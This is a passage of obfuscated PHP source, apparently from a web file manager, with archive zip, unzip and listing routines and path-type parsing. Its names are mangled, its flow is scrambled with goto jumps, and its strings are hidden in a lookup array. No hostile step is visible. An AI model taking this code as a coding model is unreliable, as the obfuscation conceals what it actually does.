šÙÜÉ“[29]]) { case KodIO::KOD_IO: $AÂ³‰¡ŸíØ = self::$driverListSystem[$B•ÉƒêÖ°ñ]; break; case KodIO::KOD_SOURCE: $Cô÷Ï†–é³ = $B•ÉƒêÖ°ñ . $Cô÷Ï†–é³; $AÂ³‰¡ŸíØ = array($C šÙÜÉ“[1027] => $C šÙÜÉ“[1028], $C šÙÜÉ“[6] => $aÀ´¾Ş´˜â); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Cå÷‰Áó›• = $GLOBALS[$C šÙÜÉ“[1029]]; self::$driverListUser = array_to_keyvalue($Cå÷‰Áó›•, $C šÙÜÉ“[367]); } $AÂ³‰¡ŸíØ = self::$driverListUser[$B•ÉƒêÖ°ñ]; break; case KodIO::KOD_SHARE_LINK: $AÂ³‰¡ŸíØ = array($C šÙÜÉ“[1027] => $C šÙÜÉ“[1030], $C šÙÜÉ“[6] => $aÀ´¾Ş´˜â); $Eî††À÷Š = Action($C šÙÜÉ“[1031])->sharePathInfo($aÀ´¾Ş´˜â[$C šÙÜÉ“[75]]); $Cô÷Ï†–é³ = $Eî††À÷Š[$C šÙÜÉ“[369]]; if (!$Eî††À÷Š[$C šÙÜÉ“[369]]) { $FïÙÀ‘Ÿí = Model($C šÙÜÉ“[538])->getInfo($Eî††À÷Š[$C šÙÜÉ“[441]]); $Cô÷Ï†–é³ = KodIO::clear($FïÙÀ‘Ÿí[$C šÙÜÉ“[1032]] . $aÀ´¾Ş´˜â[$C šÙÜÉ“[1025]]); $aÀ´¾Ş´˜â[$C šÙÜÉ“[439]] = $FïÙÀ‘Ÿí; $aÀ´¾Ş´˜â[$C šÙÜÉ“[1011]] = $Cô÷Ï†–é³; $AÂ³‰¡ŸíØ = array($C šÙÜÉ“[1027] => $C šÙÜÉ“[1033], $C šÙÜÉ“[6] => $aÀ´¾Ş´˜â); } break; case KodIO::KOD_SHARE_ITEM: $AÂ³‰¡ŸíØ = array($C šÙÜÉ“[1027] => $C šÙÜÉ“[1034], $C šÙÜÉ“[6] => $aÀ´¾Ş´˜â); $FïÙÀ‘Ÿí = Model($C šÙÜÉ“[538])->getInfo($aÀ´¾Ş´˜â[$C šÙÜÉ“[367]]); if ($FïÙÀ‘Ÿí[$C šÙÜÉ“[369]] == $C šÙÜÉ“[470]) { $Cô÷Ï†–é³ = KodIO::clear($FïÙÀ‘Ÿí[$C šÙÜÉ“[1032]] . $aÀ´¾Ş´˜â[$C šÙÜÉ“[1025]]); $aÀ´¾Ş´˜â[$C šÙÜÉ“[439]] = $FïÙÀ‘Ÿí; $aÀ´¾Ş´˜â[$C šÙÜÉ“[1011]] = $Cô÷Ï†–é³; $AÂ³‰¡ŸíØ = array($C šÙÜÉ“[1027] => $C šÙÜÉ“[1035], $C šÙÜÉ“[6] => $aÀ´¾Ş´˜â); } else { if (!$Cô÷Ï†–é³) { $Cô÷Ï†–é³ = $FïÙÀ‘Ÿí[$C šÙÜÉ“[369]]; } } break; default: $Cô÷Ï†–é³ = $aÀ´¾Ş´˜â[$C šÙÜÉ“[75]]; $AÂ³‰¡ŸíØ = array($C šÙÜÉ“[1027] => $C šÙÜÉ“[1036]); break; } $D—ªã²í– = $aÀ´¾Ş´˜â[$C šÙÜÉ“[75]]; if (!isset(self::$driverCache[$D—ªã²í–])) { $DšÎ“„‡ = strtolower($AÂ³‰¡ŸíØ[$C šÙÜÉ“[90]]); $FÔ†ë»œâ = $GLOBALS[$C šÙÜÉ“[6]][$C šÙÜÉ“[84]][$C šÙÜÉ“[761]]; $BšÙ¬¯Ù½ = $C šÙÜÉ“[71] . (isset($FÔ†ë»œâ[$DšÎ“„‡]) ? $FÔ†ë»œâ[$DšÎ“„‡] : ucfirst($DšÎ“„‡)); if (!class_exists($BšÙ¬¯Ù½)) { show_json("{$BšÙ¬¯Ù½}\40\x6e\x6f\x74\40\x65\170\151\x73\164\163\41", !1); } $B×•«­©‡ê = isset($AÂ³‰¡ŸíØ[$C šÙÜÉ“[6]]) ? $AÂ³‰¡ŸíØ[$C šÙÜÉ“[6]] : !1; self::$driverCache[$D—ªã²í–] = new $BšÙ¬¯Ù½($B×•«­©‡ê); } goto e·ƒÍëì¿Ø; e·ƒÍëì¿Ø: $b„°òÈÓ×… = self::$driverCache[$D—ªã²í–]; $b„°òÈÓ×…->pathDriver = $C‘÷Ë¬äŠ¾; $b„°òÈÓ×…->pathBase = $C šÙÜÉ“[33]; goto d±ª…”¤Œ¿; cÑöÈèÃÙ°: $b„°òÈÓ×…->path = $Cô÷Ï†–é³; return $b„°òÈÓ×…; goto F·õáˆ½Áè; F¥èŸĞ“æë: $C šÙÜÉ“ =& $_SERVER[¬ˆÚÂ”Éğä]; $C‘÷Ë¬äŠ¾ = $aÀ´¾Ş´˜â[$C šÙÜÉ“[1026]]; $B•ÉƒêÖ°ñ = $aÀ´¾Ş´˜â[$C šÙÜÉ“[367]]; goto D„£Î­Ï†Ü; F·õáˆ½Áè: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $F…Êæ³ëßÜ; if (!$F…Êæ³ëßÜ) { $F¶ÖŞ‘Æç = IO::init($_SERVER[¬ˆÚÂ”Éğä][8]); } return $F¶ÖŞ‘Æç; } private static function iconvSystem($b­ìŠƒ‚÷¥) { return self::local()->iconvSystem($b­ìŠƒ‚÷¥); } private static function iconvApp($fğÖÇĞÒ™×) { return self::local()->iconvApp($fğÖÇĞÒ™×); } public static function zip($EíÔ²†§ñ°, $C‡†İéÓéè = "\172\151\160", $AÌ¯ÜÈá» = '', $EÉÂòÃ«ô = REPEAT_RENAME) { goto F°õ½£Ô; Eªøµî°¾ì: $B…³ÈˆŠÈã = !1; if (!$AÌ¯ÜÈá» && $FŸ«ÈßÌ¤->getType() == $a„±ª¤ùâË[102]) { $FËÎ¡Ò­‘ = self::zipFileList($EíÔ²†§ñ°); } else { $B…³ÈˆŠÈã = $AÌ¯ÜÈá» ? $AÌ¯ÜÈá» : TEMP_FILES . $a„±ª¤ùâË[1038] . time() . rand_string(8) . $a„±ª¤ùâË[8]; mk_dir($B…³ÈˆŠÈã); $FËÎ¡Ò­‘ = self::zipFileList($EíÔ²†§ñ°, $B…³ÈˆŠÈã); } $D°ÀÍùÖ÷” = $FƒÖ®ÊÌø[$a„±ª¤ùâË[28]]; goto bó¡ÄÆ‰š; F°õ½£Ô: $a„±ª¤ùâË =& $_SERVER[¬ˆÚÂ”Éğä]; $FŸ«ÈßÌ¤ = self::init($EíÔ²†§ñ°[0][$a„±ª¤ùâË[75]]); $FƒÖ®ÊÌø = self::info($EíÔ²†§ñ°[0][$a„±ª¤ùâË[75]]); goto Eªøµî°¾ì; B’”ºåº‡³: if ($AÌ¯ÜÈá» || !$B…³ÈˆŠÈã) { if ($B…³ÈˆŠÈã && strstr($B…³ÈˆŠÈã, TEMP_FILES)) { $DÂ…ñºä’Ï = $FËÎ¡Ò­‘ = array(); recursion_dir($D‚¶†¹Ñâ‰, $DÂ…ñºä’Ï, $FËÎ¡Ò­‘, 0); foreach ($DÂ…ñºä’Ï as $b”ÔäÀ‰Í) { del_dir($b”ÔäÀ‰Í); } foreach ($FËÎ¡Ò­‘ as $e°ƒ°ß†ù) { if ($e°ƒ°ß†ù == $b÷ƒªŠ½×) { continue; } del_file($e°ƒ°ß†ù); } } return $a¡ ŸŒÜ¯‡; } $dğ²œÈß‘‹ = self::pathFather($FƒÖ®ÊÌø[$a„±ª¤ùâË[75]]); $b³ŒŞ˜ˆ„ = self::move($a¡ ŸŒÜ¯‡, $dğ²œÈß‘‹, $EÉÂòÃ«ô); goto c¢Ÿ´Ï·š; bó¡ÄÆ‰š: if (count($FËÎ¡Ò­‘) > 1) { $cŒµ˜İ†¿ = IO::info(IO::pathFather($FƒÖ®ÊÌø[$a„±ª¤ùâË[75]])); $D°ÀÍùÖ÷” = $cŒµ˜İ†¿[$a„±ª¤ùâË[28]]; } $D‚¶†¹Ñâ‰ = $B…³ÈˆŠÈã; if (!$D‚¶†¹Ñâ‰) { $D‚¶†¹Ñâ‰ = get_path_father($FƒÖ®ÊÌø[$a„±ª¤ùâË[75]]); if (!$AÌ¯ÜÈá» && $FŸ«ÈßÌ¤->getType() == $a„±ª¤ùâË[102]) { $D‚¶†¹Ñâ‰ = get_path_father($FŸ«ÈßÌ¤->path); } $BÙøéÉ¢“õ = IO::info($D‚¶†¹Ñâ‰); if (!$BÙøéÉ¢“õ[$a„±ª¤ùâË[189]]) { show_json(LNG($a„±ª¤ùâË[1039]), !1); } } goto F·îùÏâ÷; F·îùÏâ÷: $a¡ ŸŒÜ¯‡ = $D‚¶†¹Ñâ‰ . $D°ÀÍùÖ÷” . $a„±ª¤ùâË[91] . $C‡†İéÓéè; $a¡ ŸŒÜ¯‡ = get_filename_auto($a¡ ŸŒÜ¯‡, $a„±ª¤ùâË[33], $EÉÂòÃ«ô); $b÷ƒªŠ½× = self::iconvSystem($a¡ ŸŒÜ¯‡); goto C©œ‡‚™ë; C©œ‡‚™ë: foreach ($FËÎ¡Ò­‘ as $FÑÙ‚”ä¸½ => $E š‘æóŞæ) { $FËÎ¡Ò­‘[$FÑÙ‚”ä¸½] = self::iconvSystem($E š‘æóŞæ); } KodArchive::create($b÷ƒªŠ½×, $FËÎ¡Ò­‘); if (!IO::exist($a¡ ŸŒÜ¯‡)) { if ($B…³ÈˆŠÈã) { del_dir($B…³ÈˆŠÈã); } show_json(LNG($a„±ª¤ùâË[1040]), !1); } goto B’”ºåº‡³; c¢Ÿ´Ï·š: if (!$b³ŒŞ˜ˆ„) { del_dir($B…³ÈˆŠÈã); show_json(LNG($a„±ª¤ùâË[1040]), !1); } del_dir($B…³ÈˆŠÈã); return $b³ŒŞ˜ˆ„; goto EŞ¸‰¢Ë; EŞ¸‰¢Ë: } public static function unzip($a°Ú ù¯±ª, $FŸÏò£íÃ = "\x72\x65\160\x6c\141\143\145") { goto bŒî°óç¡½; bŒî°óç¡½: $f‰õÅİ±¿Ç =& $_SERVER[¬ˆÚÂ”Éğä]; $c…ñ™ˆéîÓ = $a°Ú ù¯±ª[$f‰õÅİ±¿Ç[75]]; $e¶Ş›¸ÑÔá = $a°Ú ù¯±ª[$f‰õÅİ±¿Ç[1041]]; goto E¯øè¼¬Ÿ; F‘×ø–¢¡¯: return !0; goto B ¿—©ô; A‚¼‰Ç²š’: $D“Œ°ß± = KodArchive::extract($cõ•Â‡‚½, $A¡Úˆ‡šô‘ . $f‰õÅİ±¿Ç[8], $C‚¦ÓÊºö–); self::archiveExt(); if (!$D“Œ°ß±[$f‰õÅİ±¿Ç[1045]]) { show_json($f‰õÅİ±¿Ç[1046] . $D“Œ°ß±[$f‰õÅİ±¿Ç[1047]], !1); } goto BİØ‚ĞöÍÑ; Cù®“ŒŞŸ—: if (!@file_exists(self::iconvSystem($cõ•Â‡‚½))) { $D¸ÊÉÁÌ¦ = self::localFilePath($c…ñ™ˆéîÓ, $B¼èÅÊÖôË); $cõ•Â‡‚½ = $D¸ÊÉÁÌ¦ ? $D¸ÊÉÁÌ¦ : parent::download($c…ñ™ˆéîÓ, $cõ•Â‡‚½); } $cõ•Â‡‚½ = self::iconvSystem($cõ•Â‡‚½); $C‚¦ÓÊºö– = isset($a°Ú ù¯±ª[$f‰õÅİ±¿Ç[1043]]) ? $a°Ú ù¯±ª[$f‰õÅİ±¿Ç[1043]] : $f‰õÅİ±¿Ç[1044]; goto A‚¼‰Ç²š’; E¯øè¼¬Ÿ: if (!($b° ´½šµ = parent::info($c…ñ™ˆéîÓ))) { show_json(LNG($f‰õÅİ±¿Ç[1042]), !1); } if (!($BÙâ©õ²í¬ = parent::infoFull($e¶Ş›¸ÑÔá))) { $e¶Ş›¸ÑÔá = parent::mkdir($e¶Ş›¸ÑÔá); $BÙâ©õ²í¬ = array($f‰õÅİ±¿Ç[75] => $e¶Ş›¸ÑÔá); } else { if (isset($BÙâ©õ²í¬[$f‰õÅİ±¿Ç[369]]) && trim($BÙâ©õ²í¬[$f‰õÅİ±¿Ç[75]], $f‰õÅİ±¿Ç[8]) != trim($e¶Ş›¸ÑÔá, $f‰õÅİ±¿Ç[8])) { $dÎ¨¥åìµ¸ = KodIO::make($BÙâ©õ²í¬[$f‰õÅİ±¿Ç[463]]); $DŠ‡‰÷Ì˜ä = parent::fileNameAuto($dÎ¨¥åìµ¸, $BÙâ©õ²í¬[$f‰õÅİ±¿Ç[28]], REPEAT_RENAME_FOLDER, !0); $e¶Ş›¸ÑÔá = parent::mkdir($dÎ¨¥åìµ¸ . $DŠ‡‰÷Ì˜ä); $BÙâ©õ²í¬ = array($f‰õÅİ±¿Ç[75] => $e¶Ş›¸ÑÔá); } } $e¶Ş›¸ÑÔá = $BÙâ©õ²í¬[$f‰õÅİ±¿Ç[75]]; goto C‹ÏšçÆ„; BİØ‚ĞöÍÑ: Hook::trigger($f‰õÅİ±¿Ç[1048], $A¡Úˆ‡šô‘); recursion_dir($A¡Úˆ‡šô‘, $bÓÄÏçÓ‡é, $aÆ²„ÃªÛ, 0); $d¡æ«Öêá¥ = array_merge($bÓÄÏçÓ‡é, $aÆ²„ÃªÛ); goto EĞƒ†ìœÀ²; EĞƒ†ìœÀ²: foreach ($d¡æ«Öêá¥ as $E„¨¦¹‹«”) { $E„¨¦¹‹«” = self::iconvApp($E„¨¦¹‹«”); self::move($E„¨¦¹‹«”, $e¶Ş›¸ÑÔá, $FŸÏò£íÃ); } del_dir($A¡Úˆ‡šô‘); if (!$D¸ÊÉÁÌ¦) { del_file($cõ•Â‡‚½); } goto F‘×ø–¢¡¯; C‹ÏšçÆ„: $eÔ¨ Ü«£ƒ = self::tmpFileName($b° ´½šµ); $A¡Úˆ‡šô‘ = TEMP_FILES . $eÔ¨ Ü«£ƒ; del_dir($A¡Úˆ‡šô‘); goto Bö÷Òä‡˜ ; Bö÷Òä‡˜ : mk_dir($A¡Úˆ‡šô‘); $B¼èÅÊÖôË = self::fileExt($b° ´½šµ); $cõ•Â‡‚½ = $A¡Úˆ‡šô‘ . $f‰õÅİ±¿Ç[91] . $B¼èÅÊÖôË; goto Cù®“ŒŞŸ—; B ¿—©ô: } public static function unzipList($bÊ‘öÀ–šÀ) { goto C¿Õ ˆ™À¯; eõÖåŠ ¨: $eÖÕ±ˆå÷É = self::info($Bè‚êö¾”); $eÒ‡Ê‚ŸÁ = self::fileExt($eÖÕ±ˆå÷É); $C²ŒÇÓ°› = self::tmpFileName($eÖÕ±ˆå÷É); goto e³öĞÊàíß; fìÃÆ“–: self::archiveExt(); del_dir($fˆƒ¸¹¡); if (!$föÇºÑÖŸã[$E³ö™º†ŸÓ[1045]]) { show_json($föÇºÑÖŸã[$E³ö™º†ŸÓ[1047]], !1); } goto CáÈÂÁ¢„Å; f”§Ø±Ñí¡: $e¯ºã¿—‘™ = 50000; if (request_url_safe($BÄö©å‹”ì)) { $EäÂ®Ô„ß = parse_url_query($BÄö©å‹”ì); if (!isset($EäÂ®Ô„ß[$E³ö™º†ŸÓ[75]])) { show_json($E³ö™º†ŸÓ[1050], !1); } } $Bè‚êö¾” = isset($EäÂ®Ô„ß) ? $EäÂ®Ô„ß[$E³ö™º†ŸÓ[75]] : $BÄö©å‹”ì; goto eõÖåŠ ¨; CáÈÂÁ¢„Å: $FŒäÏĞçÈ« = json_encode($föÇºÑÖŸã[$E³ö™º†ŸÓ[1047]]); self::setContent($EæŠœÏÔ, $FŒäÏĞçÈ«); if (count($föÇºÑÖŸã[$E³ö™º†ŸÓ[1047]]) >= $e¯ºã¿—‘™) { show_json(sprintf(LNG($E³ö™º†ŸÓ[1051]), count($föÇºÑÖŸã[$E³ö™º†ŸÓ[1047]])), !1); } goto f‰Ô½¾»ƒÊ; dâİô©…»: $EÏÓ„™Ê = self::iconvSystem($EÏÓ„™Ê); if ($aÌ±¹„§ >= 0) { $BŸ›ãÉ” = isset($bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[1053]]) ? $bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[1053]] : !1; $BÖ±´ˆµÊŠ = isset($bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[28]]) ? $bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[28]] : $E³ö™º†ŸÓ[33]; KodArchive::filePreview($EÏÓ„™Ê, $aÌ±¹„§, $BŸ›ãÉ”, $BÖ±´ˆµÊŠ); self::archiveExt(); die; } $föÇºÑÖŸã = KodArchive::listContent($EÏÓ„™Ê); goto fìÃÆ“–; f‰Ô½¾»ƒÊ: return $föÇºÑÖŸã[$E³ö™º†ŸÓ[1047]]; goto EŒÛœ’µó™; C¿Õ ˆ™À¯: $E³ö™º†ŸÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $BÄö©å‹”ì = $bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[75]]; $aÌ±¹„§ = isset($bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[1049]]) ? $bÊ‘öÀ–šÀ[$E³ö™º†ŸÓ[1049]] : -1; goto f”§Ø±Ñí¡; e³öĞÊàíß: if (isset($EäÂ®Ô„ß)) { $c×‰á•‚¢ß = array($EäÂ®Ô„ß[$E³ö™º†ŸÓ[75]], $EäÂ®Ô„ß[$E³ö™º†ŸÓ[1049]], $EäÂ®Ô„ß[$E³ö™º†ŸÓ[28]]); $Fß¶¹¶˜ƒò = md5(implode($E³ö™º†ŸÓ[70], $c×‰á•‚¢ß)) . $E³ö™º†ŸÓ[91] . get_path_ext($EäÂ®Ô„ß[$E³ö™º†ŸÓ[28]]); } else { $c×‰á•‚¢ß = array($eÖÕ±ˆå÷É[$E³ö™º†ŸÓ[28]], $eÖÕ±ˆå÷É[$E³ö™º†ŸÓ[75]], $eÖÕ±ˆå÷É[$E³ö™º†ŸÓ[77]]); $Fß¶¹¶˜ƒò = md5(implode($E³ö™º†ŸÓ[70], $c×‰á•‚¢ß)) . $E³ö™º†ŸÓ[91] . $eÒ‡Ê‚ŸÁ; } if ($aÌ±¹„§ == -1) { $EæŠœÏÔ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\x69\x65\167\x2f{$C²ŒÇÓ°›}\x2f{$Fß¶¹¶˜ƒò}\x2e\x6c\x6f\x67"; $a…Ğ†­¡æ = self::infoFull($EæŠœÏÔ); if ($a…Ğ†­¡æ) { $EæŠœÏÔ = $a…Ğ†­¡æ[$E³ö™º†ŸÓ[75]]; $Dãæíô¥¶È = self::getContent($EæŠœÏÔ); if ($Dãæíô¥¶È) { $FŒäÏĞçÈ« = json_decode($Dãæíô¥¶È, !0); if (count($FŒäÏĞçÈ«) >= $e¯ºã¿—‘™) { show_json(sprintf(LNG($E³ö™º†ŸÓ[1051]), count($FŒäÏĞçÈ«)), !1); } return $FŒäÏĞçÈ«; } } else { $EæŠœÏÔ = self::mkfile($EæŠœÏÔ); } } $fˆƒ¸¹¡ = TEMP_FILES . $C²ŒÇÓ°›; goto BºêÛ£³×“; BºêÛ£³×“: if (!is_dir($fˆƒ¸¹¡)) { mk_dir($fˆƒ¸¹¡); } $EÏÓ„™Ê = $fˆƒ¸¹¡ . $E³ö™º†ŸÓ[8] . $Fß¶¹¶˜ƒò; if (!@file_exists(self::iconvSystem($EÏÓ„™Ê))) { if (isset($EäÂ®Ô„ß)) { url_request($BÄö©å‹”ì, $E³ö™º†ŸÓ[1052], $EÏÓ„™Ê); } else { $b—Ø­’¬È = self::localFilePath($BÄö©å‹”ì, $eÒ‡Ê‚ŸÁ); $EÏÓ„™Ê = $b—Ø­’¬È ? $b—Ø­’¬È : self::download($BÄö©å‹”ì, $EÏÓ„™Ê); } } goto dâİô©…»; EŒÛœ’µó™: } private static function fileExt($fè™ñÂ–Ñ) { $f»ï†ƒÆŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $BÀÏ¥áŠ… = $fè™ñÂ–Ñ[$f»ï†ƒÆŠ[160]]; if ($BÀÏ¥áŠ… == $f»ï†ƒÆŠ[1054]) { $b‰ì÷Ÿ® = $f»ï†ƒÆŠ[1055]; if (substr($fè™ñÂ–Ñ[$f»ï†ƒÆŠ[28]], -strlen($b‰ì÷Ÿ®)) == $b‰ì÷Ÿ®) { $BÀÏ¥áŠ… = $f»ï†ƒÆŠ[1056]; } } self::archiveExt($BÀÏ¥áŠ…); return $BÀÏ¥áŠ…; } private static function zipFileList($dÑ¾·°¨™Ë, $b¢æ‰›ªÏá = false) { $aä»÷©¬¤Ú =& $_SERVER[¬ˆÚÂ”Éğä]; $aŠáÛå÷Šİ = array(); foreach ($dÑ¾·°¨™Ë as $FÖì×’Ã­¯) { $d’ÊÕÈ¥÷£ = $FÖì×’Ã­¯[$aä»÷©¬¤Ú[75]]; if ($b¢æ‰›ªÏá) { $d’ÊÕÈ¥÷£ = self::copy($FÖì×’Ã­¯[$aä»÷©¬¤Ú[75]], $b¢æ‰›ªÏá, $aä»÷©¬¤Ú[752]); } else { $b·‹ê–õÍñ = self::init($FÖì×’Ã­¯[$aä»÷©¬¤Ú[75]]); if ($b·‹ê–õÍñ->getType() == $aä»÷©¬¤Ú[102]) { $d’ÊÕÈ¥÷£ = $b·‹ê–õÍñ->path; } } if ($d’ÊÕÈ¥÷£ && self::local()->exist($d’ÊÕÈ¥÷£)) { $aŠáÛå÷Šİ[$FÖì×’Ã­¯[$aä»÷©¬¤Ú[75]]] = $d’ÊÕÈ¥÷£; } } if (!empty($aŠáÛå÷Šİ)) { return array_values($aŠáÛå÷Šİ); } show_json(LNG($aä»÷©¬¤Ú[1057]), !1); } public static function tmpFileName($Fë¥ù¿çÍ˜) { $CãŞÑÎŞãÅ =& $_SERVER[¬ˆÚÂ”Éğä]; $a˜Ë‡…±ä = array($Fë¥ù¿çÍ˜[$CãŞÑÎŞãÅ[28]], $Fë¥ù¿çÍ˜[$CãŞÑÎŞãÅ[75]], $Fë¥ù¿çÍ˜[$CãŞÑÎŞãÅ[77]], $Fë¥ù¿çÍ˜[$CãŞÑÎŞãÅ[461]]); return md5(implode($CãŞÑÎŞãÅ[70], $a˜Ë‡…±ä)); } private static function localFilePath($EÚ õÕØ…, $Eäœ¤Ş¶î) { goto fáÒÜùºÜ—; AÀ®òäáù§: if ($a„¹êÃå­œ[$có¢²î³‚[29]] == KodIO::KOD_SOURCE) { $cÊÙ­‹è™ñ = Model($có¢²î³‚[760])->fileInfoGet(KodIO::sourceID($EÚ õÕØ…)); if (!$cÊÙ­‹è™ñ[$có¢²î³‚[75]]) { show_json($có¢²î³‚[1060], !1); } $EÚ õÕØ… = $cÊÙ­‹è™ñ[$có¢²î³‚[75]]; } $AÀ£Ëä¼áî = self::init($EÚ õÕØ…); $DáÊÚÇ˜µŒ = $AÀ£Ëä¼áî->getType(); goto eŞïŒ¢¤‘ª; fáÒÜùºÜ—: $có¢²î³‚ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($Eäœ¤Ş¶î == $có¢²î³‚[1058] && strtoupper(substr(PHP_OS, 0, 3)) == $có¢²î³‚[1059]) { return !1; } $a„¹êÃå­œ = KodIO::parse($EÚ õÕØ…); goto AÀ®òäáù§; eŞïŒ¢¤‘ª: if ($DáÊÚÇ˜µŒ == $có¢²î³‚[102] || $DáÊÚÇ˜µŒ == $có¢²î³‚[1061]) { if (!$AÀ£Ëä¼áî->exist($AÀ£Ëä¼áî->path)) { show_json(LNG($có¢²î³‚[101]), !1); } return $AÀ£Ëä¼áî->path; } return !1; goto AØ¥­÷Ñƒ; AØ¥­÷Ñƒ: } private static function archiveExt($DŸø¼õ«—Ÿ = '') { $GLOBALS[$_SERVER[¬ˆÚÂ”Éğä][1062]] = $DŸø¼õ«—Ÿ; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\122\145\x63\x79\143\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\145\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\106\151\154\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\151\x6c\x65\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\160\x52\x6f\x6f\164\x53\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\x53\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\x53\x68\x61\x72\x65\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\162\145\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\145\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\141\162\145\x49\x74\145\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\x72\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\143\153\175"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\122\x65\x6e\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\x65\x72\175"; public static function typeList() { $e¨Óì—É·ï =& $_SERVER[¬ˆÚÂ”Éğä]; return array($e¨Óì—É·ï[1063] => self::KOD_SOURCE, $e¨Óì—É·ï[1064] => self::KOD_USER_RECYCLE, $e¨Óì—É·ï[1065] => self::KOD_USER_FAV, $e¨Óì—É·ï[1066] => self::KOD_USER_FILE_TAG, $e¨Óì—É·ï[1067] => self::KOD_USER_FILE_TYPE, $e¨Óì—É·ï[1068] => self::KOD_GROUP_ROOT_SELF, $e¨Óì—É·ï[1069] => self::KOD_USER_SHARE, $e¨Óì—É·ï[1070] => self::KOD_USER_SHARE_LINK, $e¨Óì—É·ï[1071] => self::KOD_USER_SHARE_TO_ME, $e¨Óì—É·ï[1072] => self::KOD_SHARE_ITEM, $e¨Óì—É·ï[1073] => self::KOD_SHARE_LINK, $e¨Óì—É·ï[1074] => self::KOD_SEARCH, $e¨Óì—É·ï[1075] => self::KOD_BLOCK, $e¨Óì—É·ï[1076] => self::KOD_IO, $e¨Óì—É·ï[1077] => self::KOD_USER_RECENT, $e¨Óì—É·ï[1078] => self::KOD_USER_DRIVER); } public static function parse($D·ÔàÂÁˆ) { goto F±Ÿœİ½è; F±Ÿœİ½è: $E£ÜôŞì‡ˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $D·ÔàÂÁˆ = self::clear($D·ÔàÂÁˆ); $C˜îÎ­Ö¹É = array_values(self::typeList()); goto AÁÈ÷¦†Ë; bÉó“°ËÛù: $cÂ»¢­»— = array($E£ÜôŞì‡ˆ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b“œ™™ï–[$E£ÜôŞì‡ˆ[1083]] = in_array($b“œ™™ï–[$E£ÜôŞì‡ˆ[29]], $cÂ»¢­»—); return $b“œ™™ï–; goto BæÆÔŠíË; AÁÈ÷¦†Ë: preg_match($E£ÜôŞì‡ˆ[1079], $D·ÔàÂÁˆ, $C´â¿…Š´Œ); $b“œ™™ï– = array($E£ÜôŞì‡ˆ[388] => !1, $E£ÜôŞì‡ˆ[1080] => !1, $E£ÜôŞì‡ˆ[385] => !1, $E£ÜôŞì‡ˆ[75] => $D·ÔàÂÁˆ, $E£ÜôŞì‡ˆ[1026] => !1, $E£ÜôŞì‡ˆ[1025] => $E£ÜôŞì‡ˆ[33]); if (is_array($C´â¿…Š´Œ) && count($C´â¿…Š´Œ) == 5) { $AÏèôëŞ©¢ = $E£ÜôŞì‡ˆ[1081] . $C´â¿…Š´Œ[2] . $E£ÜôŞì‡ˆ[315]; if (in_array($AÏèôëŞ©¢, $C˜îÎ­Ö¹É)) { $b“œ™™ï–[$E£ÜôŞì‡ˆ[1026]] = $C´â¿…Š´Œ[1]; $b“œ™™ï–[$E£ÜôŞì‡ˆ[29]] = $AÏèôëŞ©¢; $b“œ™™ï–[$E£ÜôŞì‡ˆ[1082]] = substr($AÏèôëŞ©¢, 1, -1); $b“œ™™ï–[$E£ÜôŞì‡ˆ[367]] = $C´â¿…Š´Œ[3]; } $b“œ™™ï–[$E£ÜôŞì‡ˆ[1025]] = $C´â¿…Š´Œ[4]; } goto bÉó“°ËÛù; BæÆÔŠíË: } public static function clear($C¢ê‹•ÇÃ) { goto bâ’­¾¿ÔŠ; B·ÀĞ¸‡¸Ã: $C¢ê‹•ÇÃ = preg_replace($c´õÏ’‚‹‚[1086], $c´õÏ’‚‹‚[8], $C¢ê‹•ÇÃ); if ($C¢ê‹•ÇÃ == $c´õÏ’‚‹‚[8]) { return $c´õÏ’‚‹‚[8]; } $C¢ê‹•ÇÃ = rtrim($C¢ê‹•ÇÃ, $c´õÏ’‚‹‚[8]); goto Fİ˜ãä¿; Fİ˜ãä¿: return $C¢ê‹•ÇÃ; goto Cù™ºØÖ®ƒ; bâ’­¾¿ÔŠ: $c´õÏ’‚‹‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $C¢ê‹•ÇÃ = str_replace(array($c´õÏ’‚‹‚[1005], $c´õÏ’‚‹‚[217]), $c´õÏ’‚‹‚[50], $C¢ê‹•ÇÃ); $C¢ê‹•ÇÃ = str_replace($c´õÏ’‚‹‚[93], $c´õÏ’‚‹‚[8], $C¢ê‹•ÇÃ); goto f¦Õê²ßßŸ; f¦Õê²ßßŸ: $bö´©÷ÜÊ« = $c´õÏ’‚‹‚[1084]; if (substr($C¢ê‹•ÇÃ, 0, 3) == $c´õÏ’‚‹‚[1085]) { $C¢ê‹•ÇÃ = substr($C¢ê‹•ÇÃ, 3); } while (strstr($C¢ê‹•ÇÃ, 